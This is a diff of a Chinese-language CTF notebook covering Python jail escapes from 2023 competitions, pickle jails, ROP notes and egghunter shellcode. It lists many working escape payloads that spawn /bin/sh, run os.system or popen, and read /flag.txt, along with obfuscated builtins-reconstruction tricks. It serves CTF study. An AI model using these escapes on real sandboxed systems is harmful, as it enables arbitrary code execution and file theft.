@@ -438,19 +438,19 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
   - `(lambda:__loader__.load_module("os").system("/bin/sh"))()`
   - `(lambda:().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["__import__"]("os").system("/bin/sh"))()`
   - `__build_class__.__self__.__import__("os").system("sh")`
-  - [rattler_read](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/pwn/rattler_read)
-    - ```py
-        """
-        g=(print(g.gi_frame.f_back.f_back.f_builtins['open']('/flag.txt').read())for x in(0,))
-        for x in g:0
-        """.strip()
-                .replace("\n", "\r")
-      ```
+- [rattler_read](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/pwn/rattler_read)
+    ```py
+    """
+    g=(print(g.gi_frame.f_back.f_back.f_builtins['open']('/flag.txt').read())for x in(0,))
+    for x in g:0
+    """.strip()
+    .replace("\n", "\r")
+    ```
     - `[print(y('/flag.txt').read()) for x,y in enumerate(string.Formatter().get_field('a.__self__.open', [], {'a': repr})) if x==0]`
     - `print(string.Formatter().get_field("a.__init__.__globals__[sys]", [], kwargs={"a":string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], kwargs={"a":[]})[0]().pop(107)})[0].modules.pop('os').popen('cmd').read())`
     - https://github.com/nikosChalk/ctf-writeups/tree/master/uiuctf23/pyjail/rattler-read/writeup : `class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); \rBaz().format("{0.Random.__init__.__globals__[_os].system}", random)`
     - https://ur4ndom.dev/posts/2023-07-02-uiuctf-rattler-read/ ：`string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")`,`for f in (g := (g.gi_frame.f_back.f_back for _ in [1])): print(f.f_builtins)`(逃逸exec的上下文然后请求builtin。这句还没有实现执行命令或者读文件，只是导出builtins。导出后参考上面的用法使用)
-  - [Censorship](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship)：环境包含flag变量需要泄露+绕过滤
+- [Censorship](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship)：环境包含flag变量需要泄露+绕过滤
     - 覆盖程序函数从而取消过滤。如题目用ascii(input)来保证输入只能是ascii。我们可以让`ascii = lambda x: x`，然后就能用非ascii字符绕过
     - https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/misc/censorship ：题目中存在包含flag的变量`_`，直接`locals()[_]`然后keyerror
       - 类似的还有`{}[_]`,`vars()[_],globals()[_]`.要求题目会返回exception的内容
@@ -458,15 +458,16 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
     - `vars(vars()['__bu' + chr(105) + chr(108) + chr(116) + chr(105) + 'ns__'])['pr' + chr(ord('A') ^ ord('(')) + 'n' + chr(ord('H') ^ ord('<')) + ''](vars()[chr(102) + chr(108) + chr(97) + chr(103)])`
     - https://github.com/rwandi-ctf/ctf-writeups/blob/main/amateursctf2023/censorships.md#censorship ：`vars(globals()["__buil" + chr(116) + "ins__"])["prin" + chr(116)](_)`。vars+globals构造字典取print
     - https://xhacka.github.io/posts/writeup/2023/07/19/Censorship/ ：`vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())`
-  - [Censorship Lite](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship-lite)：类似Censorship但更多过滤
+- [Censorship Lite](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship-lite)：类似Censorship但更多过滤
     - intend解法可以getshell，但是有点复杂
     - `any="".__mod__;print(flag)`:覆盖any函数后过滤失效，直接print. https://hackmd.io/@yqroo/Censorship-series
     - `vars(vars()['__bu' + chr(ord('A')^ord('(')) + chr(ord('E')^ord(')')) + chr(ord('H') ^ ord('<')) + chr(ord('A')^ord('(')) + 'ns__'])['pr' + chr(ord('A') ^ ord('(')) + 'n' + chr(ord('H') ^ ord('<')) + ''](vars()['f' + chr(ord('E')^ord(')')) + 'ag'])`
     - https://xhacka.github.io/posts/writeup/2023/07/19/Censorship/#censorship-lite : `vars(vars()[[*vars()][ord('A')-ord('B')]])[[*vars(vars()[[*vars()][ord('A')-ord('B')]])][ord('M')-ord('A')]]()`,开启pdb
     - https://github.com/aparker314159/ctf-writeups/blob/main/AmateursCTF2023/censorships.md ：利用[tadpole operator](https://devblogs.microsoft.com/oldnewthing/20150525-00/?p=45044)(c++里面一个冷门语法，python里也有，作用是返回加上/减去1后的值，但不像`++,--`那样改变原变量的值。`-~y`等同于y+1,`~-y`等同于y-1)
-  - [Censorship Lite++](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship-lite%2B%2B):泄露flag变量，但是过滤部分字符和符号以及全部数字
+- [Censorship Lite++](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship-lite%2B%2B):泄露flag变量，但是过滤部分字符和符号以及全部数字
     - https://github.com/rwandi-ctf/ctf-writeups/blob/main/amateursctf2023/censorships.md#censorship-lite-1 :过滤掉部分字符后可以利用python对字符串的[转换](https://stackoverflow.com/questions/961632/convert-integer-to-string-in-python)从函数等地方取。
-  - [Get and set](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Get%20and%20set):能无限次对某个空object使用`pydash.set_`和`pydash.get`，参数无限制，实现rce。总体思路：Get `__builtins__` from `__reduce_ex__(3)[0].__builtins__`, and you can call arbitrary functions using magic methods like `__getattr__` or `__getitem__`
+- [Get and set](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Get%20and%20set):能无限次对某个空object使用`pydash.set_`和`pydash.get`，参数无限制，实现rce。总体思路：Get `__builtins__` from `__reduce_ex__(3)[0].__builtins__`, and you can call arbitrary functions using magic methods like `__getattr__` or `__getitem__`
+- [You shall not call](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call),[wp](https://gist.github.com/lebr0nli/eec8f5addd77064f1fa0e8b22b6a54f5)；[You shall not call Revenge](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call-revenge),[wp](https://gist.github.com/lebr0nli/53216005991d012470c0bde0f38952b1):两个都是有关pickle的的pyjail，用有限的pickle code构造pickle object。前者只需读文件，revenge需要得到rce
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 ```python
 p=remote("",443,ssl=True)
@@ -1177,3 +1178,8 @@ def csu(rbx, rbp, r12, r13, r14, r15, last):
 - 利用setcontext处的gadget执行rop。rop链的构造可以使用pwntools的SigreturnFrame()，也可以手动写。当题目开启沙盒时，可将hook改为这里的地址实现orw
 110. [scanf与malloc_consolidate](https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_20)
 - 当通过scanf，gets等走IO指针的读入函数读入大量数据时，若默认缓冲区（0x400）不够存放这些数据，则会申请一个large bin存放这些数据，例如读入0x666个字节的数据，则会申请0x810大小的large bin，并且在读入结束后，将申请的large bin进行free，其过程中由于申请了large bin，因此会触发malloc_consolidate
+111. 阅读[nightmare](https://guyinatuxedo.github.io/)时的笔记
+- https://guyinatuxedo.github.io/07-bof_static/bkp16_simplecalc/index.html ：当free的参数是0时，free会直接返回
+- https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html ：当输入被转为float再存入内存时如何构造ropchain
+112. [Hunting](https://github.com/luisrodrigues154/Cyber-Security/tree/master/HackTheBox/Challenges/Pwn/Hunting)
+- [Egghunter Shellcode](https://anubissec.github.io/Egghunter-Shellcode/)([64位](https://pentesterslife.blog/2017/11/24/x64-egg-hunting-in-linux-systems/))构造。这类shellcode用于在内存中找指定内容同时避免访问无效地址。目标通常开头有特殊字符串，shellcode便利用access测试某个内存页是否可访问，能访问就在当前内存页搜寻特殊字符串，不能访问就切换下一页。这样一直重复直到找到目标
